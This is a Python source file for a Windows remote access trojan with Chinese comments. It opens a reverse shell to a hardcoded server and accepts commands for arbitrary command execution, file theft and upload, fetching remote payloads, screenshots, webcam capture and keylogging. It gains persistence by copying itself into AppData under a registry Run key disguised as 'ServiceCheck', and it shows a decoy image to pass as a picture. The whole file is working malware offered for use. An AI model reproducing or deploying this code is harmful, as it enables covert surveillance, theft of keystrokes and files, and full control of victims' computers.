import socket
import subprocess
import json
import time
import os
import sys
import shutil
import base64
import requests
import ctypes
from mss import mss
import threading
import pynput.keyboard
import platform

ServerIP = '192.168.1.68'
ServerPort = 54321
File_Location = os.environ['appdata'] + '\\srv.exe'
ImageFile = '\R.jpg'
kl_file = os.environ['appdata'] + '\\srv.txt'
keys = ""
os_info = platform.system()

def process_keys(key):
    global keys
    try:
        keys += str(key.char)
    except AttributeError:
        if key == key.space:
            keys += ' '
        elif key == key.enter:
            keys += '\n'
        elif key == key.up:
            exit
        elif key == key.down:
            exit
        elif key == key.left:
            exit
        elif key == key.right:
            exit
        else:
            keys = keys + " [" + str(key) + "] "

def write_keys():
    global keys
    with open(kl_file, 'a') as klfile:
        klfile.write(keys)
        keys = ''
        klfile.close()
        timer = threading.Timer(5, write_keys)
        timer.start()

def kl_start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        write_keys()
        keyboard_listener.join()

def reliable_send(data):
    json_data = json.dumps(data)
    s.send(bytes(json_data,encoding='utf-8')) 

def reliable_recv():
    json_data = bytearray(0)
    while True:
        try:
            json_data += s.recv(1024)
            # print(json_data)
            return json.loads(json_data)
        except ValueError:
            continue

def connection():
    while True:
        try:
            time.sleep(5)
            global s
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ServerIP,ServerPort))
            # 建立soket
            communication()
            s.close()
        except Exception as e:
            print(e)
            continue

def communication():
    # 溝通
    while True:
        command = reliable_recv()
        if command == 'q':
            break
        elif command[:4] == 'help':
            help_data = """
                cd [path]               Chang Dirrectory\n
                download  [filename]    Download file from client to server\n
                upload [filename]       Upload file from server to client\n
                get [url]               Get file from URL\n
                start [program]         Start a program\n
                screenshot              Take screenshot\n
                check                   Checl administrator priviledges\n
                keylog_start            Start keylog data\n
                keylog_dump             Show keylog data\n
                [command]               CMD command
                q                       Quit
            """
            reliable_send(help_data)
        elif command[0:2] == 'os':
            try:
                os_info = platform.system()
                reliable_send(os_info)
            except:
                failed = '[!!] OS info not found'
                reliable_send(failed)
        elif command[0:2] == 'cd' and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[0:8] == 'download':
            try:
                with open(command[9:],'rb') as file_down:
                    content = file_down.read()
                    reliable_send(base64.b64encode(content).decode('ascii'))
            except:
                failed = '[!!] Fail to download'
                reliable_send(failed)
        elif command[:6] == 'upload':
            result = reliable_recv()
            if result[:4] != '[!!]':
                with open(command[7:],'wb') as file_up:
                    file_up.write(base64.b64decode(result))
        elif command[:6] == 'webcam':
            try:
                import cv2
                cap = cv2.VideoCapture(0)
                
                ret, frame  = cap.read()
                if not ret:
                    raise Exception
                
                cv2.imwrite("webcam_image.jpg", frame)
                with open('webcam_image.jpg', 'rb') as ss:
                    reliable_send(base64.b64encode(ss.read()).decode('ascii'))
                os.remove('webcam_image.jpg')
                cap.release()

            except Exception as e:
                reliable_send('[!!]'+str(e))
        elif command[:3] == 'get':
            try:
                url = command[4:]
                get_response = requests.get(url)
                file_name = url.split('/')[-1]
                with open(file_name,'wb') as out_file:
                    out_file.write(get_response.content)
                reliable_send('[+] File Downloaded!')
            except:
                reliable_send('[!!] Download Failed!')
        elif command[:5] == 'start':
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send('[+] Program Started!')
            except:
                reliable_send('[!!] Program cannot Start!')
        elif command[:10] == 'screenshot':
            try:
                with mss() as screenshot:
                    screenshot.shot()
                with open('monitor-1.png', 'rb') as ss:
                    reliable_send(base64.b64encode(ss.read()).decode('ascii'))
                os.remove('monitor-1.png')
            except:
                reliable_send('[!!] Failed to Take Screenshot!')
        elif command[:5] == 'check':
            try:
                os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
                reliable_send('[+] Great, You have Administrator Privileges!')
            except:
                reliable_send('[!!] Sorry, You are not Administrator !')
        elif command[:12] == 'keylog_start':
            kl_thread = threading.Thread(target=kl_start)
            kl_thread.start()
        elif command[:11] == 'keylog_dump':
            kl_data = open(kl_file, 'r')
            reliable_send(kl_data.read())
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            response = proc.stdout.read() + proc.stderr.read()
            reliable_send(response.decode('cp950'))

#自我複製
if not os.path.exists(File_Location):
    shutil.copyfile(sys.executable, File_Location)
    #註冊機碼
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ServiceCheck /t REG_SZ /d "'+ File_Location + '"',shell=True)

#開啟圖片
try:
    img = sys._MEIPASS + ImageFile
    subprocess.Popen(img, SHELL=True)
except:
    A = 1
    B = 2
    SUP = A + B + B + A

#建立連線
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 連線
connection()

# 斷線
s.close()